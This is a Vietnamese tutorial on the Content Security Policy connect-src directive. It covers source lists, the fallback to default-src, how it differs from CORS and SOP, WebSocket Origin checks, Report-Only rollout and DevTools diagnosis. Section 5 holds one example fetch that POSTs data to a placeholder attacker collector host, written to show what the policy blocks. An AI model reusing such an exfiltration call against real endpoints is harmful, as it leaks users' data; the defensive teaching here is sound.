# CSP connect-src: kiểm soát các kết nối do trang khởi tạo

## 1. connect-src bảo vệ điều gì?

Một trang web không chỉ tải HTML, CSS, hình ảnh và JavaScript. Sau khi chạy, JavaScript còn có thể gọi API, mở kết nối thời gian thực, gửi telemetry hoặc trao đổi dữ liệu với dịch vụ bên ngoài. Những kết nối này có thể mang session context, dữ liệu người dùng hoặc thông tin nghiệp vụ.

**Content Security Policy (CSP)** cung cấp directive `connect-src` để giới hạn những đích mà tài liệu được phép kết nối bằng các API mạng do script sử dụng. Ví dụ, trang chỉ cần gọi API tại `https://api.example.com` và mở WebSocket tới `wss://realtime.example.com` thì chính sách có thể chỉ cho phép hai đích đó.

Nếu một đoạn script độc hại được chèn vào trang, `connect-src` có thể hạn chế một số kênh mà script dùng để gửi dữ liệu ra ngoài. Đây là một lớp giảm thiểu tác động; nó không loại bỏ XSS, không thay thế output encoding, Trusted Types, xác thực hoặc phân quyền phía server.

Trong module bảo mật trình duyệt, `connect-src` cần được thiết kế cùng với origin, SOP, CORS, cookie, CSP và các security headers. Cần phân biệt quyền khởi tạo kết nối của trang với quyền đọc phản hồi từ server.

Sau bài học, bạn có thể:

- Giải thích `connect-src` kiểm soát những loại kết nối nào.
- Viết source list chỉ cho phép API và dịch vụ thời gian thực cần thiết.
- Phân biệt `connect-src`, `default-src`, CORS và kiểm tra Origin của WebSocket.
- Triển khai CSP Report-Only trước khi enforcement.
- Chẩn đoán lỗi kết nối bằng DevTools và CSP violation reports.

## 2. connect-src nằm ở đâu trong CSP?

`connect-src` là một fetch directive. Nó quy định các nguồn hợp lệ cho một số request được khởi tạo từ nội dung của document, chủ yếu qua các API kết nối.

Ví dụ header:

```http
Content-Security-Policy: default-src 'self'; connect-src 'self' https://api.example.com wss://realtime.example.com
```

Chính sách này:

- Cho phép kết nối cùng origin với document nhờ `'self'`.
- Cho phép kết nối HTTPS tới `api.example.com`.
- Cho phép WebSocket tới host `realtime.example.com` qua WSS.
- Không cho phép các đích kết nối khác, trừ khi có directive khác hoặc cơ chế CSP liên quan thay đổi chính sách.

Nếu `connect-src` không được khai báo, CSP dùng `default-src` làm fallback cho directive này. Nếu cả hai đều không có, CSP không đặt giới hạn connect-src cụ thể.

Ví dụ:

```http
Content-Security-Policy: default-src 'self'
```

Trong trường hợp này, các kết nối do `connect-src` kiểm soát chỉ được phép tới nguồn `'self'`. Nếu trang cần gọi API khác origin, request đó sẽ bị CSP chặn cho tới khi source list được cập nhật.

**Khi đã khai báo `connect-src`, directive này thay thế fallback `default-src` cho nhóm kết nối mà nó kiểm soát.** Thêm `connect-src` quá rộng có thể mở rộng quyền kết nối dù các directive tải script hoặc image đang chặt.

## 3. Những API và phần tử chịu ảnh hưởng

`connect-src` kiểm soát các giao tiếp phổ biến sau:

| API/phần tử | Ví dụ | Ghi chú |
| --- | --- | --- |
| Fetch API | `fetch("https://api.example.com/me")` | Request do JavaScript khởi tạo. |
| XMLHttpRequest | `xhr.open("GET", url)` | API mạng kiểu cũ, vẫn gặp trong nhiều thư viện. |
| WebSocket | `new WebSocket("wss://realtime.example.com")` | Kết nối hai chiều; nên khai báo WSS rõ ràng. |
| EventSource | `new EventSource("https://events.example.com/stream")` | Server-Sent Events, luồng dữ liệu một chiều từ server. |
| `navigator.sendBeacon()` | Gửi telemetry khi trang sắp rời đi. | Đích gửi vẫn phải được chính sách cho phép. |
| `<a ping>` | Link có thuộc tính `ping` gửi ping URL khi được kích hoạt. | Cũng thuộc nhóm kết nối do document khởi tạo. |

Ví dụ:

```javascript
// Fetch
const profile = await fetch("https://api.example.com/profile");

// XMLHttpRequest
const xhr = new XMLHttpRequest();
xhr.open("GET", "https://api.example.com/status");
xhr.send();

// WebSocket
const socket = new WebSocket("wss://realtime.example.com/socket");

// Server-Sent Events
const events = new EventSource("https://events.example.com/stream");

// Beacon
navigator.sendBeacon("https://metrics.example.com/collect", "page-exit");
```

Các URL trên chỉ là ví dụ. Trang chỉ nên được cấp quyền tới những endpoint thực sự cần cho chức năng của nó.

### 3.1 connect-src không điều khiển mọi tài nguyên

Mỗi nhóm tài nguyên có directive riêng. Ví dụ:

| Hoạt động | Directive thường liên quan |
| --- | --- |
| Tải JavaScript | `script-src` |
| Tải CSS | `style-src` |
| Tải ảnh | `img-src` |
| Tải font | `font-src` |
| Nhúng frame | `frame-src` |
| Gửi form | `form-action` |
| Kết nối fetch/XHR/WebSocket | `connect-src` |

Không thêm một API host vào `connect-src` rồi kỳ vọng nó cũng được phép tải script hoặc image từ host đó. Ngược lại, cho phép một host trong `img-src` không có nghĩa JavaScript được phép fetch tới host đó.

## 4. Source expressions thường dùng

`connect-src` nhận source list theo cú pháp CSP. Các dạng thường gặp:

| Source expression | Ý nghĩa |
| --- | --- |
| `'self'` | Origin của document hiện tại theo quy tắc CSP. |
| `'none'` | Không cho phép nguồn nào trong directive. |
| `https://api.example.com` | Cho phép host qua HTTPS. |
| `wss://realtime.example.com` | Cho phép WebSocket Secure tới host chỉ định. |
| `https:` | Cho phép các URL dùng scheme HTTPS; phạm vi rộng hơn một host cụ thể. |
| `*` | Wildcard nguồn rộng; không nên dùng như mặc định. |

Ví dụ source list tối thiểu:

```http
Content-Security-Policy: default-src 'none'; connect-src 'self' https://api.example.com wss://realtime.example.com
```

Chính sách này đặt mặc định từ chối các nhóm tài nguyên chưa được cấp quyền, đồng thời chỉ mở các kết nối đã nêu. Tuy nhiên, những directive khác như `script-src`, `img-src`, `style-src`, `font-src`, `form-action` và `frame-ancestors` cần được thiết kế riêng theo ứng dụng.

### 4.1 'self' và khác biệt scheme/host/port

Origin gồm scheme, host và port. Ví dụ `https://app.example.com` khác origin với `http://app.example.com`, `https://api.example.com` hoặc `https://app.example.com:8443`.

`'self'` giúp cho phép kết nối về origin của document. Nó không tự cấp quyền tới mọi subdomain. Nếu frontend ở `https://app.example.com` gọi `https://api.example.com`, API có origin khác và cần được khai báo rõ.

Với WebSocket, nên khai báo `wss://` tường minh thay vì giả định `'self'` luôn bao phủ cách browser ánh xạ scheme WebSocket. Hành vi tương thích của `'self'` với `ws:`/`wss:` từng khác nhau giữa browser; khai báo scheme và host thực tế giúp chính sách rõ ràng hơn.

### 4.2 Tránh wildcard rộng

Ví dụ quá rộng:

```http
Content-Security-Policy: connect-src *
```

Chính sách này cho phép trang kết nối tới rất nhiều đích. Nếu XSS xảy ra, attacker có thêm nhiều lựa chọn để gửi dữ liệu tới máy chủ do họ kiểm soát.

Thay vào đó, liệt kê host cụ thể:

```http
Content-Security-Policy: connect-src 'self' https://api.example.com wss://realtime.example.com
```

Không dùng `https:` hoặc `*` chỉ để làm biến mất lỗi console. Nếu cần nhiều endpoint, hãy lập danh sách từ luồng nghiệp vụ thực tế và giới hạn theo môi trường.

## 5. Ví dụ luồng kết nối API và WebSocket

Giả sử một ứng dụng có:

- Frontend: `https://app.example.com`.
- REST API: `https://api.example.com`.
- Dịch vụ realtime: `wss://realtime.example.com`.
- Dịch vụ phân tích: `https://metrics.example.net`.

Ứng dụng thực sự chỉ cần REST API và WebSocket. CSP có thể là:

```http
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self'; connect-src 'self' https://api.example.com wss://realtime.example.com; object-src 'none'; base-uri 'self'; frame-ancestors 'none'
```

Request hợp lệ:

```javascript
const response = await fetch("https://api.example.com/v1/profile");
const socket = new WebSocket("wss://realtime.example.com/socket");
```

Request tới host chưa được cho phép:

```javascript
fetch("https://collector.attacker.invalid/receive", {
  method: "POST",
  body: "sample-data"
});
```

Browser sẽ áp dụng CSP và chặn kết nối tới host ngoài source list. Đây là giới hạn ở phía trình duyệt; server vẫn cần xác thực và kiểm tra quyền với các request được phép.

### 5.1 Chỉ cấp quyền cho endpoint cần thiết

Nếu một ứng dụng chỉ gọi một API, không nên cho phép toàn bộ domain của nhà cung cấp khi có thể giới hạn host cụ thể. Cần cân nhắc:

- API production và staging có host riêng.
- Host analytics hoặc logging có nhận dữ liệu cá nhân hay không.
- SDK bên thứ ba có mở kết nối tới host phụ nào.
- WebSocket endpoint có host và scheme riêng.
- Redirect từ endpoint được phép có thể dẫn tới host khác.

Source list là quyền của document, không phải allowlist theo path nghiệp vụ ở backend. Ngay cả khi CSP giới hạn host, API vẫn phải kiểm tra endpoint, method, token và quyền truy cập.

## 6. connect-src, CORS và SOP là ba cơ chế khác nhau

Đây là điểm dễ nhầm khi một request bị chặn:

| Cơ chế | Câu hỏi mà cơ chế trả lời | Hành vi |
| --- | --- | --- |
| CSP `connect-src` | Trang có được phép khởi tạo kết nối tới đích này không? | Browser chặn request nếu đích không thuộc source list. |
| CORS | JavaScript có được phép đọc response cross-origin không? | Browser kiểm tra CORS headers sau khi request được gửi theo luồng tương ứng. |
| SOP | Script có được truy cập dữ liệu của origin khác không? | Hạn chế truy cập DOM và dữ liệu cross-origin. |

Ví dụ:

1. CSP không cho `https://api.example.net`: browser chặn kết nối do vi phạm `connect-src`.
2. CSP cho phép host nhưng server không trả CORS header hợp lệ: request có thể được gửi, nhưng JavaScript không được đọc response.
3. CORS cho phép frontend đọc response: điều đó không có nghĩa CSP cho phép kết nối nếu `connect-src` đang chặn.

**CSP cho phép kết nối không đồng nghĩa CORS cho phép đọc response.** Hai chính sách phải cùng đáp ứng khi ứng dụng cần fetch dữ liệu cross-origin.

### 6.1 CORS không phải lớp thay thế connect-src

Server API cấu hình CORS không thể buộc browser bỏ qua CSP của trang gọi. Nếu `connect-src` chặn endpoint, việc API trả `Access-Control-Allow-Origin` đúng cũng không giúp request đi tiếp.

Ngược lại, thêm API vào `connect-src` không cấp quyền CORS. Server vẫn cần trả CORS headers đúng cho origin được phép, đặc biệt khi request có credentials.

### 6.2 WebSocket có kiểm tra Origin ở server

WebSocket handshake có header `Origin` do browser gửi. Server WebSocket nên xác minh Origin theo allowlist của ứng dụng, nhất là khi dùng cookie để xác thực handshake. Không dựa vào CSP phía client làm cơ chế xác thực nguồn; client ngoài browser có thể không thực thi CSP.

WebSocket không dùng CORS response-header protocol giống fetch/XHR. CSP `connect-src` vẫn kiểm soát việc trang tạo WebSocket, còn server cần tự xác minh Origin, xác thực và phân quyền.

## 7. Redirect và endpoint phụ

Một request tới host được cho phép có thể nhận redirect. Redirect làm luồng kết nối phức tạp hơn vì browser có thể phải kiểm tra URL đích tiếp theo theo CSP và các quy tắc Fetch/CSP của trình duyệt.

Không thiết kế dựa trên giả định rằng cho phép một API host đồng nghĩa mọi redirect từ host đó đều được phép. Khi gặp lỗi:

- Kiểm tra URL ban đầu và URL cuối cùng trong Network.
- Xem response status 301/302/303/307/308 và `Location`.
- Xác định redirect có chuyển sang host hoặc scheme khác không.
- Cân nhắc gọi trực tiếp URL cuối cùng hoặc giữ redirect trong các host đã được phê duyệt.

Tránh dùng redirect endpoint mở để chuyển dữ liệu tới host tùy ý. CSP là lớp kiểm soát ở browser; backend cũng cần hạn chế open redirect và xác thực URL callback.

## 8. Bảo vệ WebSocket và EventSource

Kết nối thời gian thực thường bị bỏ sót khi thiết kế CSP vì chúng không giống một lệnh fetch thông thường.

### 8.1 WebSocket

Ví dụ:

```javascript
const socket = new WebSocket("wss://realtime.example.com/socket");

socket.addEventListener("open", () => {
  console.log("WebSocket connected");
});

socket.addEventListener("message", event => {
  // Xem nội dung là dữ liệu; không đưa thẳng vào innerHTML.
  document.querySelector("#events").textContent = event.data;
});
```

CSP:

```http
Content-Security-Policy: connect-src 'self' https://api.example.com wss://realtime.example.com
```

Server WebSocket nên:

- Kiểm tra header Origin theo allowlist chính xác.
- Xác thực phiên hoặc token trong handshake theo thiết kế.
- Kiểm tra quyền trên từng channel/topic/message.
- Giới hạn kích thước message, tốc độ và thời gian sống kết nối.
- Không coi kết nối đã mở là quyền truy cập mọi dữ liệu.

### 8.2 EventSource / Server-Sent Events

```javascript
const source = new EventSource("https://events.example.com/stream");

source.addEventListener("message", event => {
  document.querySelector("#status").textContent = event.data;
});
```

Nếu dùng EventSource cross-origin với cookie, cần xem xét credentials mode và CORS response phù hợp. Ví dụ constructor có tùy chọn:

```javascript
const source = new EventSource("https://events.example.com/stream", {
  withCredentials: true
});
```

Khi bật credentials, server phải áp dụng CORS chính xác cho origin được phép. `connect-src` chỉ xác định đích mà trang được phép kết nối.

## 9. Chọn source list theo môi trường

Môi trường phát triển thường có host và port khác production. Không nên đưa localhost hoặc staging vào CSP production chỉ để tiện debug.

Ví dụ production:

```http
Content-Security-Policy: default-src 'self'; connect-src 'self' https://api.example.com wss://realtime.example.com
```

Ví dụ development:

```http
Content-Security-Policy: default-src 'self'; connect-src 'self' http://localhost:4000 ws://localhost:4001
```

Tách cấu hình theo build/deployment environment. Nếu môi trường development dùng HTTPS, hãy khai báo đúng scheme thực tế. Không dùng `http:` hoặc `ws:` rộng trong production để tránh lỗi cấu hình và hạ thấp yêu cầu transport.

## 10. Triển khai CSP Report-Only trước khi chặn

Thay đổi `connect-src` trực tiếp sang enforcement có thể làm hỏng các chức năng chưa được thống kê, chẳng hạn SDK analytics, endpoint realtime hoặc API chỉ được gọi trong một luồng ít gặp. Có thể bắt đầu bằng **Content-Security-Policy-Report-Only** để browser ghi nhận vi phạm mà chưa chặn kết nối.

Ví dụ:

```http
Content-Security-Policy-Report-Only: default-src 'self'; connect-src 'self' https://api.example.com wss://realtime.example.com; report-uri /csp-report
```

Trong giai đoạn này, browser vẫn cho phép kết nối theo chính sách enforcement hiện có, nhưng tạo violation report khi tài liệu vi phạm chính sách Report-Only. Điều này giúp đội phát triển quan sát những host ứng dụng thực sự cần.

Khi đã phân loại report và xác nhận source list phù hợp, chuyển chính sách sang header enforcement:

```http
Content-Security-Policy: default-src 'self'; connect-src 'self' https://api.example.com wss://realtime.example.com
```

### 10.1 Gửi report tới endpoint

Có thể cấu hình endpoint báo cáo bằng Reporting API:

```http
Reporting-Endpoints: csp-endpoint="https://reports.example.com/csp"
Content-Security-Policy-Report-Only: default-src 'self'; connect-src 'self' https://api.example.com; report-to csp-endpoint; report-uri /csp-report
```

`report-to` tham chiếu tên endpoint được khai báo trong `Reporting-Endpoints`. `report-uri` là cơ chế cũ hơn, được giữ trong ví dụ để hỗ trợ các triển khai browser còn dựa vào định dạng báo cáo legacy. Kiểm tra browser mục tiêu và nền tảng nhận report trước khi chọn cấu hình cuối.

Violation report có thể chứa URL document, directive vi phạm, blocked URL và thông tin request liên quan. Endpoint báo cáo cần:

- Chấp nhận định dạng report mà browser gửi và xử lý lỗi parse.
- Giới hạn kích thước, tốc độ và thời gian lưu report.
- Không giả định report là dữ liệu đáng tin; client có thể tạo lưu lượng report lớn.
- Giảm hoặc loại bỏ query string nhạy cảm khi lưu URL.
- Kiểm soát quyền truy cập log và không biến endpoint thành nơi lưu dữ liệu cá nhân không cần thiết.

Không thêm endpoint báo cáo vào `connect-src` chỉ dựa trên giả định rằng mọi loại CSP report đều được gửi giống fetch. Cần cấu hình Reporting API và kiểm tra thực tế trên browser mục tiêu; nếu ứng dụng còn tự gọi endpoint report bằng fetch/beacon thì kết nối đó chịu `connect-src` như bình thường.

### 10.2 Phân loại report trước khi thêm host

Một report không tự động có nghĩa phải thêm host vào allowlist. Với mỗi blocked URL, hãy hỏi:

1. Kết nối đó thuộc chức năng sản phẩm cần thiết hay do SDK/extension/script không mong muốn tạo ra?
2. Host có do tổ chức kiểm soát hoặc có hợp đồng tin cậy phù hợp không?
3. Có thể bỏ tích hợp hoặc chuyển dữ liệu qua API backend của mình không?
4. Host có thể được giới hạn theo scheme và hostname cụ thể không?
5. Report có phải từ trình duyệt cũ, trang cache cũ hoặc môi trường staging không?

Chỉ thêm nguồn khi có lý do nghiệp vụ rõ ràng và đã xác định dữ liệu được gửi tới đích đó.

## 11. Chẩn đoán connect-src bằng DevTools

Khi một kết nối bị CSP chặn, mở DevTools của browser và kiểm tra cả Console lẫn Network.

### 11.1 Console

Thông báo thường nêu:

- Directive vi phạm, ví dụ `connect-src`.
- URL hoặc origin bị chặn.
- Source list đang có hiệu lực.
- Tên directive fallback nếu chính sách dùng `default-src`.

Đọc nguyên thông báo để phân biệt lỗi CSP với lỗi CORS, DNS, TLS hoặc lỗi ứng dụng. Các lỗi này có thể xuất hiện gần nhau nhưng cần cách xử lý khác nhau.

### 11.2 Network

1. Mở tab Network và bật Preserve log nếu request xảy ra trong quá trình navigation.
2. Lọc Fetch/XHR hoặc tìm hostname bị chặn.
3. Xem cột Status và phần Headers/Initiator.
4. Kiểm tra URL ban đầu, redirect chain, scheme, host và port.
5. Chọn document chính và kiểm tra response header `Content-Security-Policy` cùng `Content-Security-Policy-Report-Only`.
6. Kiểm tra có nhiều CSP headers hoặc meta policy cùng áp dụng không.

Một request bị CSP chặn có thể hiển thị là blocked hoặc không có response HTTP thông thường vì browser không gửi request ra mạng. Vì vậy, đừng tìm response status từ API nếu chính sách đã chặn trước khi kết nối được tạo.

### 11.3 Thử bằng một ma trận nhỏ

Giả sử document ở `https://app.example.com` và CSP là:

```http
Content-Security-Policy: default-src 'self'; connect-src 'self' https://api.example.com wss://realtime.example.com
```

| Thử nghiệm | Kết quả mong đợi theo connect-src |
| --- | --- |
| Fetch `https://app.example.com/status` | Được phép bởi `'self'`. |
| Fetch `https://api.example.com/profile` | Được phép bởi host source. |
| Fetch `https://other.example.net/data` | Bị chặn. |
| WebSocket `wss://realtime.example.com/socket` | Được phép bởi source WSS cụ thể. |
| WebSocket `wss://other.example.net/socket` | Bị chặn. |
| Fetch `http://api.example.com/profile` | Bị chặn vì scheme không khớp source HTTPS. |

Kết quả cuối cùng còn phụ thuộc directive khác, CORS, TLS, cookie và phản hồi server. Bài kiểm tra này chỉ xác minh phần quyết định của `connect-src`.

### 11.4 curl không thực thi CSP của document

curl có thể kiểm tra response header mà server phát ra, nhưng nó không chạy document và không thực thi CSP như browser. Một lệnh curl thành công tới API không chứng minh JavaScript của trang được phép kết nối; tương tự, curl không tái hiện CSP violation trong Console.

## 12. Lỗi cấu hình thường gặp

| Lỗi | Nguyên nhân | Cách xử lý |
| --- | --- | --- |
| API cùng tổ chức bị chặn | API có origin khác frontend nên không thuộc `'self'`. | Thêm đúng scheme/host/port cần thiết. |
| WebSocket bị chặn dù fetch hoạt động | Source list chỉ có HTTPS API, thiếu WSS host. | Khai báo `wss://` endpoint thực tế. |
| Dùng `'self'` nhưng WebSocket không kết nối | Ánh xạ scheme WebSocket với `'self'` có khác biệt triển khai. | Khai báo WSS/WS cụ thể theo môi trường. |
| Thêm host vào `default-src` nhưng vẫn lỗi | `connect-src` đã được khai báo nên fallback không còn áp dụng. | Cập nhật `connect-src` trực tiếp. |
| CSP cho phép nhưng CORS báo lỗi | CSP cho phép khởi tạo request; server chưa cấp CORS permission. | Sửa CORS ở API theo origin cần thiết. |
| Kết nối staging chạy trên production | Source list dùng wildcard hoặc scheme rộng. | Tách cấu hình môi trường và thu hẹp allowlist. |
| Một số request bị chặn sau redirect | URL đích hoặc scheme cuối không phù hợp chính sách/luồng fetch. | Kiểm tra redirect chain và gọi URL đích phù hợp. |
| CSP Report-Only không chặn request | Đây là hành vi đúng của chế độ chỉ báo cáo. | Chuyển sang enforcement sau khi xử lý report. |
| Report không tới endpoint | Reporting endpoint hoặc định dạng report chưa được cấu hình đúng. | Kiểm tra `Reporting-Endpoints`, `report-to`, `report-uri` và browser hỗ trợ. |
| Thêm nhiều CSP headers làm ứng dụng chặt hơn dự kiến | Các policy enforcement cùng áp dụng và phải cùng được đáp ứng. | Hợp nhất chính sách hoặc đánh giá từng header do proxy/app phát ra. |

## 13. Quy trình thiết kế allowlist connect-src

Một quy trình có thể áp dụng khi xây dựng hoặc siết CSP:

1. **Liệt kê kết nối:** dùng Network panel để thu thập fetch, XHR, WebSocket, EventSource và beacon trong các luồng chính.
2. **Phân loại đích:** nhóm theo API nội bộ, realtime, analytics, dịch vụ bên thứ ba và môi trường.
3. **Đánh giá dữ liệu:** xác định request gửi thông tin nào, có credentials hay dữ liệu cá nhân không.
4. **Tạo source list nhỏ nhất:** dùng `'self'` và host/scheme chính xác; không dùng wildcard để xử lý nhanh.
5. **Chạy Report-Only:** theo dõi các luồng chính, luồng ít gặp và báo cáo từ browser mục tiêu.
6. **Xử lý từng vi phạm:** bỏ tích hợp không cần; chỉ thêm host đã được phê duyệt.
7. **Enforce:** phát CSP qua HTTP response header và theo dõi lỗi sau triển khai.
8. **Duy trì:** rà soát khi thêm SDK, đổi API host, đổi kiến trúc realtime hoặc chuyển môi trường.

### 13.1 Nhiều CSP policies được kết hợp như thế nào?

Nếu response có nhiều CSP enforcement headers, browser áp dụng tất cả các policy đó. Một policy bổ sung không thể nới lỏng policy khác; request phải đáp ứng mọi policy có hiệu lực. Ví dụ, policy thứ nhất cho phép API A và policy thứ hai chỉ cho phép API B thì một kết nối tới API A có thể vẫn bị policy thứ hai chặn.

Điều này thường xuất hiện khi cả ứng dụng và reverse proxy đều thêm CSP. Kiểm tra header thực tế trong response thay vì chỉ đọc cấu hình ở một tầng.

`Content-Security-Policy-Report-Only` báo cáo vi phạm mà không tự chặn request. Khi một enforcement policy và một Report-Only policy cùng tồn tại, browser vừa thực thi policy enforcement vừa ghi nhận vi phạm theo policy chỉ báo cáo.

## 14. Tổng kết

`connect-src` giới hạn những đích mà document có thể kết nối bằng Fetch, XHR, WebSocket, EventSource, `sendBeacon` và một số cơ chế ping. Khi không khai báo, directive này dùng `default-src` làm fallback. Source list nên ưu tiên `'self'` và host/scheme cụ thể cần thiết; tránh wildcard rộng.

CSP, CORS và SOP giải quyết các câu hỏi khác nhau: `connect-src` quyết định trang có được khởi tạo kết nối hay không; CORS quyết định JavaScript có được đọc response cross-origin hay không; SOP giới hạn truy cập dữ liệu giữa các origin. Với WebSocket, ngoài CSP cần xác minh Origin, authentication và authorization ở server. Hãy triển khai theo allowlist tối thiểu, thử nghiệm bằng Report-Only và kiểm tra cả URL redirect lẫn endpoint thực tế trong DevTools.
